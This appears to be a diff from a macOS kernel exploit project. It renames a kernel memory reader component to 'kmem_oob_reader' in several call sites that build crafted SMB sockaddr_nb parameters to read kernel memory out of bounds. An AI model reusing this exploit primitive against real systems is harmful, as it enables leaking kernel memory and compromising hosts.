@@ -22,7 +22,7 @@
 #include <xe/util/misc.h>
 
 #include "zkext_neighbor_reader.h"
-#include "kmem_neighbor_reader.h"
+#include "kmem_oob_reader.h"
 #include "allocator_nrnw.h"
 #include "macos_params.h"
 
@@ -72,7 +72,7 @@ double kmem_zkext_neighbor_reader_check(const struct sockaddr_in* smb_addr, uint
         dispatch_semaphore_t sem = dispatch_semaphore_create(0);
         
         dispatch_async(xe_dispatch_queue(), ^() {
-            struct kmem_neighbor_reader_args params;
+            struct kmem_oob_reader_args params;
             params.smb_addr = *smb_addr;
             params.saddr_snb_len = sizeof(struct sockaddr_nb);
             params.saddr_ioc_len = sizeof(struct sockaddr_nb);
@@ -82,7 +82,7 @@ double kmem_zkext_neighbor_reader_check(const struct sockaddr_in* smb_addr, uint
             params.laddr_ioc_len = zone_size;
             params.laddr_snb_name_seglen = to_read;
             
-            kmem_neighbor_reader_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
+            kmem_oob_reader_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
             dispatch_semaphore_signal(sem);
         });
         
@@ -137,7 +137,7 @@ int kmem_zkext_neighbor_reader_read_internal(const struct sockaddr_in* smb_addr,
                 
         uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
         
-        struct kmem_neighbor_reader_args params;
+        struct kmem_oob_reader_args params;
         params.smb_addr = *smb_addr;
         params.saddr_snb_len = sizeof(struct sockaddr_nb);
         params.saddr_ioc_len = sizeof(struct sockaddr_nb);
@@ -146,7 +146,7 @@ int kmem_zkext_neighbor_reader_read_internal(const struct sockaddr_in* smb_addr,
         params.laddr_ioc_len = zone_size;
         params.laddr_snb_name_seglen = snb_name_seglen;
         
-        kmem_neighbor_reader_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
+        kmem_oob_reader_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
         
         xe_assert_cond(local_nb_name_size, >=, snb_name_seglen);
         
